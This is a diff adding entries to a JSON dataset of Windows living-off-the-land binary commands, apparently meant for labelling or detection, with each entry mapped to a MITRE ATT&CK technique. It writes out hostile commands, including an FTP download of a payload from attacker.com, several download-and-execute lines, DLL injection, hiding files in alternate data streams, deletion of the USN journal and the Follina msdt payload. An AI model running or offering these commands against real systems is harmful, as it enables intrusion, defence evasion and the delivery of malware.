+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":80,
         "Command":"fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}",
         "Description":"Zero out a file File System Utility",
         "RiskScore":"",
@@ -480,7 +960,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":41,
+        "ID":81,
+        "Command":"fsutil.exe usn deletejournal \/d c:",
+        "Description":"Delete the USN journal volume to hide file creation activity File System Utility",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1485",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":82,
+        "Command":"fsutil.exe trace decode",
+        "Description":"Executes a pre-planted binary named netsh.exe from the current directory. File System Utility",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":83,
         "Command":"echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt",
         "Description":"Executes the commands you put inside the text file. A binary designed for connecting to FTP servers",
         "RiskScore":"",
@@ -492,7 +996,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":42,
+        "ID":84,
+        "Command":"cmd.exe \/c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET \/payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"",
+        "Description":"Download A binary designed for connecting to FTP servers",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":85,
         "Command":"Gpscript \/logon",
         "Description":"Executes logon scripts configured in Group Policy. Used by group policy to process scripts",
         "RiskScore":"",
@@ -504,7 +1020,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":43,
+        "ID":86,
+        "Command":"Gpscript \/startup",
+        "Description":"Executes startup scripts configured in Group Policy Used by group policy to process scripts",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":87,
         "Command":"HH.exe {REMOTEURL:.bat}",
         "Description":"Open the target batch script with HTML Help. Binary used for processing chm files in Windows",
         "RiskScore":"",
@@ -516,7 +1044,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":44,
+        "ID":88,
+        "Command":"HH.exe {PATH_ABSOLUTE:.exe}",
+        "Description":"Executes specified executable with HTML Help. Binary used for processing chm files in Windows",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":89,
+        "Command":"HH.exe {REMOTEURL:.chm}",
+        "Description":"Executes a remote .chm file which can contain commands. Binary used for processing chm files in Windows",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":90,
         "Command":"C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}",
         "Description":"IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache. Microsoft IME Open Extended Dictionary Module",
         "RiskScore":"",
@@ -528,7 +1080,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":45,
+        "ID":91,
         "Command":"ie4uinit.exe -BaseSettings",
         "Description":"Executes commands from a specially prepared ie4uinit.inf file. Executes commands from a specially prepared ie4uinit.inf file.",
         "RiskScore":"",
@@ -540,7 +1092,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":46,
+        "ID":92,
         "Command":"set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe \/out:{PATH_ABSOLUTE:.cab}",
         "Description":"Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe. Diagnostics Utility for Internet Explorer",
         "RiskScore":"",
@@ -552,7 +1104,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":47,
+        "ID":93,
         "Command":"ieexec.exe {REMOTEURL:.exe}",
         "Description":"Downloads and executes executable from the remote server. The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.",
         "RiskScore":"",
@@ -564,7 +1116,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":48,
+        "ID":94,
+        "Command":"ieexec.exe {REMOTEURL:.exe}",
+        "Description":"Downloads and executes executable from the remote server. The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":95,
         "Command":"ilasm.exe {PATH_ABSOLUTE:.txt} \/exe",
         "Description":"Binary file used by .NET to compile C#\/intermediate (IL) code to .exe used for compile c# code into dll or exe.",
         "RiskScore":"",
@@ -576,7 +1140,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":49,
+        "ID":96,
+        "Command":"ilasm.exe {PATH_ABSOLUTE:.txt} \/dll",
+        "Description":"Binary file used by .NET to compile C#\/intermediate (IL) code to dll used for compile c# code into dll or exe.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":97,
         "Command":"InfDefaultInstall.exe {PATH:.inf}",
         "Description":"Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file. Binary used to perform installation based on content inside inf files",
         "RiskScore":"",
@@ -588,7 +1164,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":50,
+        "ID":98,
         "Command":"InstallUtil.exe \/logfile= \/LogToConsole=false \/U {PATH:.dll}",
         "Description":"Execute the target .NET DLL or EXE. The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies",
         "RiskScore":"",
@@ -600,7 +1176,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":51,
+        "ID":99,
+        "Command":"InstallUtil.exe \/logfile= \/LogToConsole=false \/U {PATH:.dll}",
+        "Description":"Execute the target .NET DLL or EXE. The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":100,
+        "Command":"InstallUtil.exe {REMOTEURL}",
+        "Description":"It will download a remote payload and place it in INetCache. The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":101,
         "Command":"jsc.exe {PATH:.js}",
         "Description":"Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file with the same name. Binary file used by .NET to compile JavaScript code to .exe or .dll format",
         "RiskScore":"",
@@ -612,7 +1212,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":52,
+        "ID":102,
+        "Command":"jsc.exe \/t:library {PATH:.js}",
+        "Description":"Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name. Binary file used by .NET to compile JavaScript code to .exe or .dll format",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":103,
         "Command":"Ldifde -i -f {PATH:.ldf}",
         "Description":"Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http:\/\/example.org\/somefile.txt, the file will be downloaded into IE temp folder. Creates, modifies, and deletes LDAP directory objects.",
         "RiskScore":"",
@@ -624,7 +1236,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":53,
+        "ID":104,
         "Command":"makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab",
         "Description":"Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file. Binary to package existing files into a cabinet (.cab) file",
         "RiskScore":"",
@@ -636,7 +1248,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":54,
+        "ID":105,
+        "Command":"makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab",
+        "Description":"Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file. Binary to package existing files into a cabinet (.cab) file",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":106,
+        "Command":"makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}",
+        "Description":"Download and compresses the target file and stores it in the target file. Binary to package existing files into a cabinet (.cab) file",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":107,
+        "Command":"makecab \/F {PATH:.ddf}",
+        "Description":"Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification. Binary to package existing files into a cabinet (.cab) file",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1036",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":108,
         "Command":"MavInject.exe 3110 \/INJECTRUNNING {PATH_ABSOLUTE:.dll}",
         "Description":"Inject evil.dll into a process with PID 3110. Used by App-v in Windows",
         "RiskScore":"",
@@ -648,7 +1296,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":55,
+        "ID":109,
+        "Command":"Mavinject.exe 4172 \/INJECTRUNNING {PATH_ABSOLUTE}:file.dll",
+        "Description":"Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172 Used by App-v in Windows",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":110,
         "Command":"Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}",
         "Description":"Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any extension accepted). A utility included with .NET that is capable of compiling and executing C# or VB.net code.",
         "RiskScore":"",
@@ -660,7 +1320,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":56,
+        "ID":111,
+        "Command":"Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}",
+        "Description":"Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file. A utility included with .NET that is capable of compiling and executing C# or VB.net code.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":112,
+        "Command":"Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}",
+        "Description":"Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file. A utility included with .NET that is capable of compiling and executing C# or VB.net code.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":113,
         "Command":"mmc.exe -Embedding {PATH_ABSOLUTE:.msc}",
         "Description":"Launch a 'backgrounded' MMC process and invoke a COM payload Load snap-ins to locally and remotely manage Windows systems",
         "RiskScore":"",
@@ -672,7 +1356,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":57,
+        "ID":114,
+        "Command":"mmc.exe gpedit.msc",
+        "Description":"Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC. Load snap-ins to locally and remotely manage Windows systems",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.014",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":115,
         "Command":"MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}",
         "Description":"Download file to specified path - Slashes work as well as dashes (\/DownloadFile, \/url, \/path) Binary part of Windows Defender. Used to manage settings in Windows Defender",
         "RiskScore":"",
@@ -684,7 +1380,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":58,
+        "ID":116,
+        "Command":"copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe",
+        "Description":"Download file to specified path - Slashes work as well as dashes (\/DownloadFile, \/url, \/path) [updated version to bypass Windows 10 mitigation] Binary part of Windows Defender. Used to manage settings in Windows Defender",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":117,
+        "Command":"MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe",
+        "Description":"Download file to machine and store it in Alternate Data Stream Binary part of Windows Defender. Used to manage settings in Windows Defender",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":118,
         "Command":"msbuild.exe {PATH:.xml}",
         "Description":"Build and execute a C# project stored in the target XML file. Used to compile and execute code",
         "RiskScore":"",
@@ -696,7 +1416,55 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":59,
+        "ID":119,
+        "Command":"msbuild.exe {PATH:.csproj}",
+        "Description":"Build and execute a C# project stored in the target csproj file. Used to compile and execute code",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":120,
+        "Command":"msbuild.exe \/logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",
+        "Description":"Executes generated Logger DLL file with TargetLogger export. Used to compile and execute code",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":121,
+        "Command":"msbuild.exe {PATH:.proj}",
+        "Description":"Execute JScript\/VBScript code through XML\/XSL Transformation. Requires Visual Studio MSBuild v14.0+. Used to compile and execute code",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":122,
+        "Command":"msbuild.exe @{PATH:.rsp}",
+        "Description":"By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line. Used to compile and execute code",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1036",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":123,
         "Command":"Msconfig.exe -5",
         "Description":"Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml. MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows",
         "RiskScore":"",
@@ -708,7 +1476,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":60,
+        "ID":124,
         "Command":"msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} \/skip TRUE",
         "Description":"Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file. Microsoft diagnostics tool",
         "RiskScore":"",
@@ -720,7 +1488,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":61,
+        "ID":125,
+        "Command":"msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} \/skip TRUE",
+        "Description":"Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file. Microsoft diagnostics tool",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":126,
+        "Command":"msdt.exe \/id PCWDiagnostic \/skip force \/param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=\/..\/..\/$(calc).exe\"",
+        "Description":"Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update. Microsoft diagnostics tool",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":127,
         "Command":"msedge.exe {REMOTEURL:.exe.txt}",
         "Description":"Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen. Microsoft Edge browser",
         "RiskScore":"",
@@ -732,7 +1524,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":62,
+        "ID":128,
+        "Command":"msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}",
+        "Description":"Edge will silently download the file. File extension should be .html and binaries should be encoded. Microsoft Edge browser",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":129,
+        "Command":"msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"",
+        "Description":"Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command Microsoft Edge browser",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.015",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":130,
         "Command":"mshta.exe {PATH:.hta}",
         "Description":"Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript. Used by Windows to execute html applications. (.hta)",
         "RiskScore":"",
@@ -744,7 +1560,55 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":63,
+        "ID":131,
+        "Command":"mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:{REMOTEURL:.sct}\"\")\"))",
+        "Description":"Executes VBScript supplied as a command line argument. Used by Windows to execute html applications. (.hta)",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.005",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":132,
+        "Command":"mshta.exe javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();",
+        "Description":"Executes JavaScript supplied as a command line argument. Used by Windows to execute html applications. (.hta)",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.005",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":133,
+        "Command":"mshta.exe \"{PATH_ABSOLUTE}:file.hta\"",
+        "Description":"Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript. Used by Windows to execute html applications. (.hta)",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.005",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":134,
+        "Command":"mshta.exe {REMOTEURL}",
+        "Description":"It will download a remote payload and place it in INetCache. Used by Windows to execute html applications. (.hta)",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":135,
         "Command":"msiexec \/quiet \/i {PATH:.msi}",
         "Description":"Installs the target .MSI file silently. Used by Windows to execute msi files",
         "RiskScore":"",
@@ -756,7 +1620,55 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":64,
+        "ID":136,
+        "Command":"msiexec \/q \/i {REMOTEURL}",
+        "Description":"Installs the target remote & renamed .MSI file silently. Used by Windows to execute msi files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.007",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":137,
+        "Command":"msiexec \/y {PATH_ABSOLUTE:.dll}",
+        "Description":"Calls DllRegisterServer to register the target DLL. Used by Windows to execute msi files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.007",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":138,
+        "Command":"msiexec \/z {PATH_ABSOLUTE:.dll}",
+        "Description":"Calls DllUnregisterServer to un-register the target DLL. Used by Windows to execute msi files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.007",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":139,
+        "Command":"msiexec \/i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" \/qb",
+        "Description":"Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The \/qb will skip user input. Used by Windows to execute msi files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.007",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":140,
         "Command":"netsh.exe add helper {PATH_ABSOLUTE:.dll}",
         "Description":"Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called Netsh is a Windows tool used to manipulate network interface settings.",
         "RiskScore":"",
@@ -768,7 +1680,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":65,
+        "ID":141,
         "Command":"ngen.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server using the Microsoft Native Image Generator utility. Microsoft Native Image Generator.",
         "RiskScore":"",
@@ -780,7 +1692,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":66,
+        "ID":142,
         "Command":"odbcconf \/a {REGSVR {PATH_ABSOLUTE:.dll}}",
         "Description":"Execute DllRegisterServer from DLL specified. Used in Windows for managing ODBC connections",
         "RiskScore":"",
@@ -792,7 +1704,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":67,
+        "ID":143,
+        "Command":"odbcconf INSTALLDRIVER \"lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2\"\nodbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"",
+        "Description":"Install a driver and load the DLL. Requires administrator privileges. Used in Windows for managing ODBC connections",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.008",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":144,
+        "Command":"odbcconf -f {PATH:.rsp}",
+        "Description":"Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file. Used in Windows for managing ODBC connections",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.008",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":145,
         "Command":"OfflineScannerShell",
         "Description":"Execute mpclient.dll library in the current working directory Windows Defender Offline Shell",
         "RiskScore":"",
@@ -804,7 +1740,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":68,
+        "ID":146,
         "Command":"OneDriveStandaloneUpdater",
         "Description":"Download a file from the web address specified in HKCU\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json OneDrive Standalone Updater",
         "RiskScore":"",
@@ -816,7 +1752,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":69,
+        "ID":147,
         "Command":"pcalua.exe -a {PATH:.exe}",
         "Description":"Open the target .EXE using the Program Compatibility Assistant. Program Compatibility Assistant",
         "RiskScore":"",
@@ -828,7 +1764,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":70,
+        "ID":148,
+        "Command":"pcalua.exe -a {PATH_SMB:.dll}",
+        "Description":"Open the target .DLL file with the Program Compatibilty Assistant. Program Compatibility Assistant",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":149,
+        "Command":"pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java",
+        "Description":"Open the target .CPL file with the Program Compatibility Assistant. Program Compatibility Assistant",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":150,
         "Command":"Pcwrun.exe {PATH_ABSOLUTE:.exe}",
         "Description":"Open the target .EXE file with the Program Compatibility Wizard. Program Compatibility Wizard",
         "RiskScore":"",
@@ -840,7 +1800,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":71,
+        "ID":151,
+        "Command":"Pcwrun.exe \/..\/..\/$(calc).exe",
+        "Description":"Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update. Program Compatibility Wizard",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":152,
         "Command":"pktmon.exe start --etw",
         "Description":"Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop Capture Network Packets on the windows 10 with October 2018 Update or later.",
         "RiskScore":"",
@@ -852,7 +1824,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":72,
+        "ID":153,
+        "Command":"pktmon.exe filter add -p 445",
+        "Description":"Select Desired ports for packet capture Capture Network Packets on the windows 10 with October 2018 Update or later.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1040",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":154,
         "Command":"pnputil.exe -i -a {PATH_ABSOLUTE:.inf}",
         "Description":"Used for installing drivers Used for installing drivers",
         "RiskScore":"",
